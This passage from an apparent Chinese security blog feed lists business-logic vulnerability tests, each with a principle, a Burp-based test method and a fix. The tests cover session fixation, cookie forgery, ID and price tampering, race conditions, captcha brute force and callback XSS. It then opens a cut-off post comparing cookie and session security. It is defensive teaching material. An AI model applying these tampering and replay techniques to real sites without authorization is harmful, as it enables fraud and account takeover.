title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>1.部署有效的 SSL 证书<br>2.及时部署了 SSL 也尽可能不要使用纯明文传输，降低被攻击的风险</p><h4 id="3-Session测试"><a href="#3-Session测试" class="headerlink" title="(3)Session测试"></a><strong>(3)Session测试</strong></h4><h5 id="1-Session-会话固定测试"><a href="#1-Session-会话固定测试" class="headerlink" title="1.Session 会话固定测试"></a><strong>1.Session 会话固定测试</strong></h5><h6 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h6><p>在用户进入登录页面，但还未登录时，就已经产生了一个session，用户输入信息，登录以后，session的id不会改变，也就是说没有建立新session，原来的session也没有被销毁）。攻击者事先访问系统并建立一个会话，诱使受害者使用此会话登录系统，然后攻击者再使用该会话访问系统即可登录受害者的账户。会话固定攻击的原理及流程如下图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%9A%E5%8A%A1Web6.png" alt="此处输入图片的描述"></p><h6 id="测试方法-2"><a href="#测试方法-2" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h6><p>(1)打开登录页面<br>(2)使用 Bp 查看登录前的 cookie 中的 SESSID(如果没有可以尝试登录然后伪造一个)，登陆后再查看 SESSID 如果没有更新则说明存在该漏洞</p><h6 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h6><p>在用户输入正确的用户名和密码以后(用户的权限级别发生了变化)，系统需要强制更新 SESSION，并强制原始会话失效。</p><h5 id="2-Session-会话注销测试"><a href="#2-Session-会话注销测试" class="headerlink" title="2.Session 会话注销测试"></a><strong>2.Session 会话注销测试</strong></h5><h6 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h6><p>在用户退出登录或者注销之后，服务端应将用户的会话标识 SESSID 在服务端立即注销，如果不及时注销，将导致其在退出后依然有效，攻击者在非法获取其标识符后可进行无认证登录</p><h6 id="测试方法-3"><a href="#测试方法-3" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h6><p>登陆后使用 Bp 截获数据包，然后退出登录后，对该数据包进行重放，如果重放成功则证明漏洞存在</p><h6 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h6><p>退出登录后服务端应及时清除 SESSION 会话标识符，并清空客户端浏览器的 SESSID </p><h5 id="3-Session-会话超时测试"><a href="#3-Session-会话超时测试" class="headerlink" title="3.Session 会话超时测试"></a><strong>3.Session 会话超时测试</strong></h5><h6 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h6><p>客户登陆后如果长时间与服务器没有交互操作，session 应在规定的时间内自动失效，并要求重新登录，否则可能会存在信息泄露风险。</p><h6 id="测试方法-4"><a href="#测试方法-4" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h6><p>登陆后使用 Bp 截获数据包，然后等待20~30分钟，对该数据包进行重放，如果重放成功则证明漏洞存在。</p><h6 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h6><p>建议设置会话的生存时间不要超过30分钟</p><h4 id="4-Cookie-伪造测试"><a href="#4-Cookie-伪造测试" class="headerlink" title="(4)Cookie 伪造测试"></a><strong>(4)Cookie 伪造测试</strong></h4><h5 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>服务端为了鉴别用户身份将用户的身份信息存储在 cookie 中并通过浏览器存储在用户本地的文件中，但这些信息是明文存储的，攻击者一旦通过某种攻击手段获取了用户的 cookie 就可以篡改用户的信息然后伪装成其他用户甚至是更高权限的用户进行登录。</p><h5 id="测试方法-5"><a href="#测试方法-5" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>通过 Bp 抓包然后，尝试修改用户的 cookie 部分内容，比如修改用户 id 或者用户名等，然后重放，看是否能未授权访问其他用户信息</p><h5 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>使用 session 机制解决，并设置 cookie 为 http-only ,设置 cookie 的 secure 属性(至于 cookie 和 session 机制的比较请看我的 <a href="http://www.k0rz3n.com/2019/02/03/%E5%86%8D%E8%B0%88%20Cookie%20%E5%92%8C%20Session%20%E5%AE%89%E5%85%A8%E6%80%A7/">这篇文章</a> )</p><h4 id="5-密文比对认证测试"><a href="#5-密文比对认证测试" class="headerlink" title="(5)密文比对认证测试"></a><strong>(5)密文比对认证测试</strong></h4><h5 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>一般网站在输入密码以后会在服务器端进行 hash 加密然后再与数据库中的信息进行比对来判断密码正误，但是有些网站的在输入密码以后会在客户端本地(前端)进行 hash 加密然后再传到服务器端进行验证，这样就会泄露加密方式和密钥信息。</p><h5 id="测试方法-6"><a href="#测试方法-6" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>使用 Bp 检查传输的密码的形式是不是经过了加密，然后我们可以去前端寻找有没有对应的前端加密代码，并判断加密方式和使用的密钥，然后我们可以对密码字典进行对应的加密以后再进行暴力破解</p><h5 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>请不要使用前端对密码进行加密的方式，加密处理要放在后台进行。</p><h4 id="6-登录失败信息测试"><a href="#6-登录失败信息测试" class="headerlink" title="(6)登录失败信息测试"></a><strong>(6)登录失败信息测试</strong></h4><h5 id="漏洞原理-5"><a href="#漏洞原理-5" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>在登录失败时会明确提示 用户名错误或者密码错误的信息，而不是模糊的用户名密码错误，这样攻击者就能通过返回的信息对用户名和密码进行暴力破解</p><h5 id="测试方法-7"><a href="#测试方法-7" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>使用正确的账号登录时输入错误的密码，看返回信息是否是密码错误，如果是则说明漏洞存在。</p><h5 id="修复建议-7"><a href="#修复建议-7" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>不管是用户名错误还是密码错误都不能明确的提示，返回统一的提示 “用户名或密码错误”</p><h3 id="2-业务办理模块"><a href="#2-业务办理模块" class="headerlink" title="2.业务办理模块"></a><strong>2.业务办理模块</strong></h3><h4 id="1-订单ID篡改测试"><a href="#1-订单ID篡改测试" class="headerlink" title="(1)订单ID篡改测试"></a><strong>(1)订单ID篡改测试</strong></h4><h5 id="漏洞原理-6"><a href="#漏洞原理-6" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>攻击者只要注册一个普通用户的账号就能通过遍历订单的 ID 来越权查看其它用户的订单，其中可能包含用户的身份证信息，家庭住址，电话等敏感信息。</p><h5 id="测试方法-8"><a href="#测试方法-8" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>通过抓包查看是否可以有订单号信息可以直接修改等进行越权测试</p><h5 id="修复建议-8"><a href="#修复建议-8" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>查看订单的时候要通过 session 校验查看订单者的身份，防止平行越权</p><h4 id="2-手机号码篡改测试"><a href="#2-手机号码篡改测试" class="headerlink" title="(2)手机号码篡改测试"></a><strong>(2)手机号码篡改测试</strong></h4><h5 id="漏洞原理-7"><a href="#漏洞原理-7" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>有时候手机号码作为鉴定用户身份的参数，在登录成功以后，开发者可能对一些页面的身份校验出现缺失，这样就可以通过篡改用户的手机号来进行越权</p><h5 id="测试方法-9"><a href="#测试方法-9" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>通过抓包查看是否可以有手机号信息可以直接修改从而进行越权测试</p><h5 id="修复建议-9"><a href="#修复建议-9" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>通过 session 来校验身份，防止平行越权，另外对于APP，不要完全相信从手机中读取的手机号，要做好完善的身份认证。</p><h4 id="3-用户ID篡改测试"><a href="#3-用户ID篡改测试" class="headerlink" title="(3)用户ID篡改测试"></a><strong>(3)用户ID篡改测试</strong></h4><h5 id="漏洞原理-8"><a href="#漏洞原理-8" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>有时候用户 ID 作为鉴定用户身份的参数，在登录成功以后，开发者可能对一些页面的身份校验出现缺失，这样就可以通过篡改用户的手机号来进行越权</p><h5 id="测试方法-10"><a href="#测试方法-10" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>通过抓包查看是否可以有手机号信息可以直接修改从而进行越权测试</p><h5 id="修复建议-10"><a href="#修复建议-10" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>通过 session 判断用户的身份，不要轻易相信用户传过来的 ID ，如果想通过 id 判断，那也要与 session 进行对比</p><h4 id="4-邮箱和用户篡改测试"><a href="#4-邮箱和用户篡改测试" class="headerlink" title="(4)邮箱和用户篡改测试"></a><strong>(4)邮箱和用户篡改测试</strong></h4><h5 id="漏洞原理-9"><a href="#漏洞原理-9" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>发送邮件的时候篡改其中的发件人参数可能会使得攻击者伪造发件人进行钓鱼攻击，</p><h5 id="测试方法-11"><a href="#测试方法-11" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>通过抓包查看是否可以有发件人信息可以直接修改从而进行伪造</p><h5 id="修复建议-11"><a href="#修复建议-11" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>发消息时要通过 session 判断用户的身份，只有 发件人 id 和 session 一致的时候服务器才会接受该邮件</p><h4 id="5-商品编号篡改测试"><a href="#5-商品编号篡改测试" class="headerlink" title="(5)商品编号篡改测试"></a><strong>(5)商品编号篡改测试</strong></h4><h5 id="漏洞原理-10"><a href="#漏洞原理-10" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>在生成订单跳转支付页面的时候，如果抓包可以篡改商品的金额，那么就能实现小金额购买商品，同样，除了篡改金额，还能够篡改商品的编号，即使用一个商品的价格来购买另一件商品。</p><h5 id="测试方法-12"><a href="#测试方法-12" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>通过抓包查看是否可以有金额或者商品编号信息可以直接修改从而进行伪造</p><h5 id="修复建议-12"><a href="#修复建议-12" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>商品的金额不要在客户端传入，防止被恶意篡改，如果必须在客户端输入，交易之前必须要验证</p><h4 id="6-条件竞争测试"><a href="#6-条件竞争测试" class="headerlink" title="(6)条件竞争测试"></a><strong>(6)条件竞争测试</strong></h4><h5 id="漏洞原理-11"><a href="#漏洞原理-11" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>在服务端逻辑与数据库读写存在时序问题时，可能会存在条件竞争，攻击者可以多线程并发请求，在数据库余额更新以前多次兑换积分或者购买商品。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%9A%E5%8A%A1Web7.png" alt="此处输入图片的描述"></p><h5 id="测试方法-13"><a href="#测试方法-13" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>攻击者在提交订单的时候抓包，并使用多线程的方式重放此包，部分包就可能绕过金额和次数的判断从而请求成功。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%9A%E5%8A%A1Web8.png" alt="此处输入图片的描述"></p><h5 id="修复建议-13"><a href="#修复建议-13" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>处理订单业务的时候使用锁的方式，保证业务的原子性</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%9A%E5%8A%A1Web9.png" alt="此处输入图片的描述"></p><h3 id="3-业务授权访问模块"><a href="#3-业务授权访问模块" class="headerlink" title="3.业务授权访问模块"></a><strong>3.业务授权访问模块</strong></h3><h4 id="1-未授权访问测试"><a href="#1-未授权访问测试" class="headerlink" title="(1)未授权访问测试"></a><strong>(1)未授权访问测试</strong></h4><h5 id="漏洞原理-12"><a href="#漏洞原理-12" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>用户在没有授权的情况下能直接访问需要授权才能访问的页面，</p><h5 id="测试方法-14"><a href="#测试方法-14" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>尝试在登录后台等需要授权访问的页面以后，把 URL 复制到别的浏览器中看是否能访问成功</p><h5 id="修复建议-14"><a href="#修复建议-14" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>对需要权限的页面进行 SESSION 认证，对用户访问的每一个 URL 做身份鉴别，正确校验用户的身份和 token </p><h4 id="2-越权测试测试"><a href="#2-越权测试测试" class="headerlink" title="(2)越权测试测试"></a><strong>(2)越权测试测试</strong></h4><h5 id="漏洞原理-13"><a href="#漏洞原理-13" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>水平越权：普通用户之间操作可互相影响<br>垂直越权：低权限用户能操作高权限用户才能操作的东西</p><h5 id="测试方法-15"><a href="#测试方法-15" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>Bp 抓包查看并修改低权限用户的身份信息为同等权限的其他用户或者是高权限用户后进行重放，如果成功则说明漏洞存在</p><h5 id="修复建议-15"><a href="#修复建议-15" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>对需要权限的页面进行 SESSION 认证，对用户访问的每一个 URL 做身份鉴别，正确校验用户的身份和 token </p><h3 id="4-回退模块测试"><a href="#4-回退模块测试" class="headerlink" title="4.回退模块测试"></a><strong>4.回退模块测试</strong></h3><h4 id="1-回退访问测试"><a href="#1-回退访问测试" class="headerlink" title="(1)回退访问测试"></a><strong>(1)回退访问测试</strong></h4><h5 id="漏洞原理-14"><a href="#漏洞原理-14" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>很多 web 应用存在修改密码等模块，那么在修改成功后点击浏览器的回退按钮，发现依然能重复之前的操作，这样就破坏了分步骤进行</p><h5 id="测试方法-16"><a href="#测试方法-16" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>很多 web 应用存在修改密码等模块，那么在修改成功后点击浏览器的回退按钮，发现依然能重复进行的就说明存在漏洞</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%9A%E5%8A%A1Web10.png" alt="此处输入图片的描述"></p><h5 id="修复建议-16"><a href="#修复建议-16" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>对于业务流程有多步的情况，收下判断该步的请求是不是由上一步发起的，如果不是则返回错误或者是页面失效</p><h3 id="5-验证码机制测试"><a href="#5-验证码机制测试" class="headerlink" title="5.验证码机制测试"></a><strong>5.验证码机制测试</strong></h3><h4 id="1-验证码暴力破解测试"><a href="#1-验证码暴力破解测试" class="headerlink" title="(1)验证码暴力破解测试"></a><strong>(1)验证码暴力破解测试</strong></h4><h5 id="漏洞原理-15"><a href="#漏洞原理-15" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>有些验证码是 4~6 位数字，或者是有一定可控区间的数字字符，如果没有设置好验证码的失效时间或者最大的尝试次数吗，那么攻击者就可以对其进行暴力破解。</p><h5 id="测试方法-17"><a href="#测试方法-17" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>Bp 抓取填写验证码的数据包，然后对其进行暴力破解攻击，如果在跑了数十个可能的值以后返回值没有出现失效或者出错的问题的话，那么判断漏洞存在</p><h5 id="修复建议-17"><a href="#修复建议-17" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>(1)增加验证码的强度<br>(2)合理设置验证码的失效时间<br>(3)限制一定时间内的重复尝试次数</p><h4 id="2-验证码重复使用测试"><a href="#2-验证码重复使用测试" class="headerlink" title="(2)验证码重复使用测试"></a><strong>(2)验证码重复使用测试</strong></h4><h5 id="漏洞原理-16"><a href="#漏洞原理-16" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>如果验证码验证成功后没有将 session 及时清空，验证码即可重复使用。</p><h5 id="测试方法-18"><a href="#测试方法-18" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>Bp 抓取提交验证码的请求包，在首次验证成功以后重复提交，如果依然提交成功则说明漏洞存在。</p><h5 id="修复建议-18"><a href="#修复建议-18" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>验证码在一次认证成功以后，服务端便清空认证成功的 session ，防止验证码被重复利用。</p><h4 id="3-验证码客户端回显测试"><a href="#3-验证码客户端回显测试" class="headerlink" title="(3)验证码客户端回显测试"></a><strong>(3)验证码客户端回显测试</strong></h4><h5 id="漏洞原理-17"><a href="#漏洞原理-17" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>浏览器请求服务器发送如手机验证码的同时在浏览器中查看返回包，如果此时验证码也在返回包中出现则会泄露验证信息</p><h5 id="测试方法-19"><a href="#测试方法-19" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>浏览器请求服务器发送如手机验证码的同时在浏览器中查看返回包，如果此时验证码也在返回包中则说明漏洞存在</p><h5 id="修复建议-19"><a href="#修复建议-19" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>禁止验证码本地生成，或者验证，要采取服务器端生成并验证的方式</p><h4 id="4-验证结果篡改测试"><a href="#4-验证结果篡改测试" class="headerlink" title="(4)验证结果篡改测试"></a><strong>(4)验证结果篡改测试</strong></h4><h5 id="漏洞原理-18"><a href="#漏洞原理-18" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>我们可以通过 Bp 抓取返回包，对验证结果的标志位进行篡改，如 0 改成 1 ,然后 forward 以后欺骗验证成功</p><h5 id="测试方法-20"><a href="#测试方法-20" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>我们可以通过 Bp 抓取返回包，对验证结果的标志位进行篡改，如 0 改成 1 ,然后 forward 以后欺骗验证，如果成功，则说明漏洞存在</p><h5 id="修复建议-20"><a href="#修复建议-20" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>建议在服务器端增加验证码的认证机制，对验证结果进行二次校验</p><h4 id="5-验证码自动识别测试"><a href="#5-验证码自动识别测试" class="headerlink" title="(5)验证码自动识别测试"></a><strong>(5)验证码自动识别测试</strong></h4><h5 id="漏洞原理-19"><a href="#漏洞原理-19" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>验证码强度不够，导致可以使用自动化工具进行 OCR 识别</p><h5 id="测试方法-21"><a href="#测试方法-21" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>使用自动化识别工具对验证码进行识别测试，如果识别成功则说明漏洞存在</p><h5 id="修复建议-21"><a href="#修复建议-21" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>(1)增加背景元素的干扰，如背景颜色背景字母等<br>(2)字符字体进行扭曲、粘连<br>(3)使用问答题作为验证方式，如四则运算等<br>(4)使用和使用者有关联的信息作为验证码，如最近买过的商品等</p><h3 id="6-业务流程乱序测试"><a href="#6-业务流程乱序测试" class="headerlink" title="6.业务流程乱序测试"></a><strong>6.业务流程乱序测试</strong></h3><h4 id="1-业务流程绕过测试"><a href="#1-业务流程绕过测试" class="headerlink" title="(1)业务流程绕过测试"></a><strong>(1)业务流程绕过测试</strong></h4><h5 id="漏洞原理-20"><a href="#漏洞原理-20" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>例如整个业务流程分为三步，第一步：注册发送验证码，第二步：输入验证码，第三步：注册成功，那么如果在输入验证码后抓包修改用户身份信息可以的话，就会导致第一第二步被绕过。</p><h5 id="测试方法-22"><a href="#测试方法-22" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>例如整个业务流程分为三步，第一步：注册发送验证码，第二步：输入验证码，第三步：注册成功，那么如果在输入验证码后抓包修改用户身份信息可以的话，则说明漏洞存在</p><h5 id="修复建议-22"><a href="#修复建议-22" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>对敏感信息如身份 ID 等进行加密处理，并要在服务器端进行二次校验</p><h3 id="7-业务接口调用模块测试"><a href="#7-业务接口调用模块测试" class="headerlink" title="7.业务接口调用模块测试"></a><strong>7.业务接口调用模块测试</strong></h3><h4 id="1-接口调用重放测试"><a href="#1-接口调用重放测试" class="headerlink" title="(1)接口调用重放测试"></a><strong>(1)接口调用重放测试</strong></h4><h5 id="漏洞原理-21"><a href="#漏洞原理-21" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>在短信，邮件的调用测试中，对短信邮件等接口进行重复调用测试可以发出多条数据</p><h5 id="测试方法-23"><a href="#测试方法-23" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>在短信，邮件的调用测试中，对短信邮件等接口进行重复调用测试，如果能成功发送多条数据则说明漏洞存在</p><h5 id="修复建议-23"><a href="#修复建议-23" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>(1)对生成订单环节进行验证码测试<br>(2)每个订单使用唯一的 token ，提交一次 Token 失效</p><h4 id="2-接口未授权访问测试"><a href="#2-接口未授权访问测试" class="headerlink" title="(2)接口未授权访问测试"></a><strong>(2)接口未授权访问测试</strong></h4><h5 id="漏洞原理-22"><a href="#漏洞原理-22" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>敏感的接口的调用需要用户的权限信息，但是由于没有对接口进行身份校验，攻击者可以直接去调用接口的功能，对接口进行攻击</p><h5 id="测试方法-24"><a href="#测试方法-24" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>使用 Bp 的爬虫功能对整站进行爬取，筛选出特定类型(如 json 等)的请求，然后判断该接口是否存在敏感信息，并直接将其放在浏览器中访问，如果返回的几结果包含敏感信息则说明漏洞存在</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%9A%E5%8A%A1Web11.png" alt="此处输入图片的描述"></p><h5 id="修复建议-24"><a href="#修复建议-24" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>(1)使用 token 校验，在 URL 中设置 Token 字段，只有 token 验证通过后才能使用接口，并且使用一次后 token 失效<br>(2)使用接口时，后端对登录状态进行验证，如果登陆成功则返回数据，如果失败则返回错误</p><h4 id="3-callback自定义测试"><a href="#3-callback自定义测试" class="headerlink" title="(3)callback自定义测试"></a><strong>(3)callback自定义测试</strong></h4><h5 id="漏洞原理-23"><a href="#漏洞原理-23" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>由于同源策略的限制，有时候我们需要使用 jsonp 的方式在不同源的两个地址之间交互，其中 回调函数作为 jsonp 的参数之一决定了使用的函数名，那么如果没有对 callback 的输入进行白名单过滤，被攻击者控制的话，那么就会造成 xss 等攻击</p><h5 id="测试方法-25"><a href="#测试方法-25" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>使用 Bp  的爬虫功能对整站进行爬取，筛选出带有 callback 或者 jsonp 参数的请求，并对请求响应的类型进行判断，如果是 text&#x2F;html 则对该 Callback 进行注入，看能否触发 xss</p><h5 id="修复建议-25"><a href="#修复建议-25" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>(1)严格定义返回包的 content-type 为 applocation&#x2F;json 而不是 text&#x2F;html<br>(2)建立 callback 白名单<br>(3)对 callback 参数进行过滤 HTML 标签</p><h4 id="4-Webservice-测试"><a href="#4-Webservice-测试" class="headerlink" title="(4) Webservice 测试"></a><strong>(4) Webservice 测试</strong></h4><h5 id="漏洞原理-24"><a href="#漏洞原理-24" class="headerlink" title="[漏洞原理]"></a><strong>[漏洞原理]</strong></h5><p>Webservice 这个 api 接口如果不对用户的输入进行过滤，则可能会受到 sql 注入攻击</p><h5 id="测试方法-26"><a href="#测试方法-26" class="headerlink" title="[测试方法]"></a><strong>[测试方法]</strong></h5><p>通过爬虫或者目录扫描的方法找到服务器的 webservice 链接，然后使用 AWVS 的 webservice editor 功能导入各个接口函数，通过关键词(如 get exec )定位到函数接口，使用 Http editor 对每一个接口的输入参数进行测试</p><h5 id="修复建议-26"><a href="#修复建议-26" class="headerlink" title="[修复建议]"></a><strong>[修复建议]</strong></h5><p>(1)为 webservice 添加身份认证，认证成功才能调用<br>(2)后端对输入参数进行过滤才能将其输入到函数当中<br>(3)对敏感功能的函数添加密码认证，认证通过才能使用</p><h2 id="0X04-总结"><a href="#0X04-总结" class="headerlink" title="0X04 总结"></a><strong>0X04 总结</strong></h2><p>结合着书本和资料简单总结了一下常见的一些应用逻辑漏洞和利用方式，当然还是很不全面，未来或许还会补充完善。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞研究</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>再谈 Cookie 和 Session 安全性</title>
    <link href="/2019/02/03/%E5%86%8D%E8%B0%88%20Cookie%20%E5%92%8C%20Session%20%E5%AE%89%E5%85%A8%E6%80%A7/"/>
    <url>/2019/02/03/%E5%86%8D%E8%B0%88%20Cookie%20%E5%92%8C%20Session%20%E5%AE%89%E5%85%A8%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>最近整理一些关于业务安全的东西，然后又遇到了这个问题，虽然自己每次提到这个问题第一反应都是一个是在服务器端保存另一个是在客户端保存，但我知道这并不是正确的答案，因为 session 也需要在客户端保存一个标识符 session_id，所以还是想再写一下这个问题，因为实际上一年前左右我已经写过一篇关于 cookie 和 session 的文章，<a href="http://www.k0rz3n.com/2017/07/30/cookie/">有关 cookie 和session的一些探究</a>，那这篇文章就叫做“再谈”吧。</p><h2 id="0X01-Cookie-与-Session-的博弈"><a href="#0X01-Cookie-与-Session-的博弈" class="headerlink" title="0X01 Cookie 与 Session 的博弈"></a><strong>0X01 Cookie 与 Session 的博弈</strong></h2><blockquote><p><strong>注意：</strong><br>攻击者有两种方式获取 cookie ，一种是通过中间人攻击，一种是利用 XSS 这里我们就不讨论中间人攻击对两者的影响，因为这个可以使用 SSL 进行传输防止中间人攻击，设置 cookie 的时候只要加一个Secure 选项就可以保证只在 https 的情况下传输 cookie 了。</p></blockquote><span id="more"></span><h3 id="1-能否防止重放攻击"><a href="#1-能否防止重放攻击" class="headerlink" title="1.能否防止重放攻击"></a><strong>1.能否防止重放攻击</strong></h3><p>还是回到刚刚说的那个问题，如果说 session 是保存在服务器端的 cookie 是保存在客户端是两者的最大区别的话，我不反对，但是说这是他们安全性不同的原因的话，我认为是非常片面的</p><p>熟悉 XSS 的人都知道，在 cookie 没有设置 http-only 的情况下获取 cookie 的值是非常轻松的，这也是人们常说的 cookie 是不安全的原因之一，这固然不可否认。</p><p>但是你要知道 session 他也并不是完全的就放在服务器端而和客户端没有半毛钱关系，想想也不可能，要不服务器端怎么确定客户端是谁啊，所以他必须在客户端放一个标识符 session-id，我们可以理解为 服务器端 session 数据库的一个索引，客户端每次上交这个标识符给服务器端然后服务器端根据这个标识在数据库中进行检索，从而判定用户的身份。</p><p>所以，从这一点来看，cookie 和 session 没什么本质的区别，session_id 也是放在 cookie 中的，他们都不能防止被窃取从而进行重放攻击。</p><h3 id="2-能否防止篡改攻击"><a href="#2-能否防止篡改攻击" class="headerlink" title="2.能否防止篡改攻击"></a><strong>2.能否防止篡改攻击</strong></h3><p>session 设置了以后存储在服务器端，客户端看到的只是一个session_id，这就相当于起到了一个隐藏或者说加密的作用</p><p>比如说你设置</p><pre><code class="hljs">$SESSION[&#39;user&#39;]=&#39;admin&#39;;</code></pre><p>这个返回的header就是set-cookie: sessionId:xxxxxxx(一堆加密了的字符)</p><p>但是你设置 cookie 他默认就不会加密，设置啥就显示啥</p><pre><code class="hljs">set_cooke(&#39;user&#39;, &#39;xiaoming&#39;);</code></pre><p>它返回的header就是 set-cookie: user:xiaoming</p><p>那么这一点就可以作为两者安全性的一个重要指标，这就可以防止会话的伪造攻击，攻击者即使是获取了整个 cookie 的数据（这里特指里面的 session_id，至于cookie 中除了 session_id 以外的其他内容是一些临时的数据这里不做讨论）但是攻击者并不能理解 session_id 的内容，最多只能是利用这个session_id 进行伪造，但是不能篡改 session_id 进行越权(包括水平越权和垂直越权)，而单纯使用 cookie 就不一样了 ，你看我上面这个 Cookie就是明文的，什么信息在里面一清二楚。如果攻击者拿到了这个 cookie 的话，那么就很容易联想到可以将 xiaoming 改成 admin 这类的，从而进行越权。</p><h3 id="3-新的思考"><a href="#3-新的思考" class="headerlink" title="3.新的思考"></a><strong>3.新的思考</strong></h3><p>那有人说了，既然这样我们代码里对这个 cookie 加密一下不就完了，不是起到了一样的效果？就像下面这个样子</p><pre><code class="hljs">set_cookie(&#39;user&#39;, some_encrypt(&#39;xiaoming&#39;, &#39;privatekey&#39;,&#39;timestamp&#39;)); </code></pre><p>没错，这样确实起到了防止 cookie 伪造的作用，那这样看 session 还有什么用呢？为什么不是选择仅仅加密一下 cookie 作为防止攻击的手段，而要费尽心思的设计这个 session呢？session 的优势在这里又体现在什么地方呢？</p><h4 